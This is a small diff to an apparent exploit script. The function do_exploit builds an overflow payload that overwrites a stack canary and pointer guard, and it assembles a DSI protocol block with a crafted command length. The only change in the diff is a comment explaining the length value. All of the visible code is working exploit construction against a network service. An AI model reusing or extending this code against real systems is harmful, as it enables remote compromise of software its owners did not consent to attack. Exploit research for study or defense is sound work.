@@ -106,7 +106,7 @@ def do_exploit(r, canary):
     overflow = p64(tcb) + p64(div) + b"x"*0x18 + p64(canary) + p64(pointer_guard)
     tlspage = b""
     tlspage = tlspage.ljust(0x280, b"\x41")
-    cmdlen = 0x102280-0x10+0x38+100
+    cmdlen = 0x102280-0x10+0x38+100 # len + 100 to wait for input
     dsi_block = flat(
         p8(0), p8(1), p16(1, endianness='big'),
         p32(cmdlen, endianness='big'), p32(0xdeadbeef, endianness='big'), p32(0)
